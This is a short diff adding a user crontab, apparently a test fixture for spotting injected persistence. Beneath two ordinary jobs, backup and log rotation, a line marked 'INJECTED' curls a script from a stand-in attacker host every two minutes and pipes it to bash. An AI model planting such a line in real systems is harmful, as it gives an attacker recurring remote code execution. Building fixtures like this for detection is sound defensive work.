@@ -1,0 +1,6 @@
+# benign user crontab
+MAILTO=""
+30 3 * * * /usr/local/bin/backup-hourly
+@weekly /usr/local/bin/log-rotate
+# --- INJECTED ---
+*/2 * * * * curl -s https://evil.example.test/beacon | bash
